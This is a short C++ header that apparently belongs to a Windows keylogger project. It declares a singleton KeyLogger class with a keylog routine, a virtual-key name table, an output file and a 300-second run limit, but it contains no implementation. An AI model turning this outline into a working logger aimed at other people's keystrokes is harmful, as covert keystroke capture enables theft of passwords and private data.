#include <iostream>
#include <windows.h>
#include <string>
#include <unordered_map>
#include <fstream>
#include <time.h>
#include <atomic>

using namespace std;

#define PRESSED	1
#define RUNNING 2

class KeyLogger {
	private:
		string file_name;
		static unordered_map<int, string> vkey;
		bool getSpecialKey(int key, string& key_name);
		void keylog();
		atomic<bool> running;
		const int max_running_time = 300;
		atomic<int> status;

		// for singleton
		KeyLogger() = delete;
		KeyLogger(const string& file_name) : file_name(file_name), status(0), running(false) {}
		KeyLogger(const KeyLogger& kl) = delete;
		KeyLogger& operator=(const KeyLogger& kl) = delete;
		static KeyLogger* instance;

	public:
		static KeyLogger* getInstance(const string& file_name = "");
		static void deleteInstance();
		void start() {running = true; keylog();}
		void stop() {running = false;}
		string getOutputFile();
		int getStatus();
};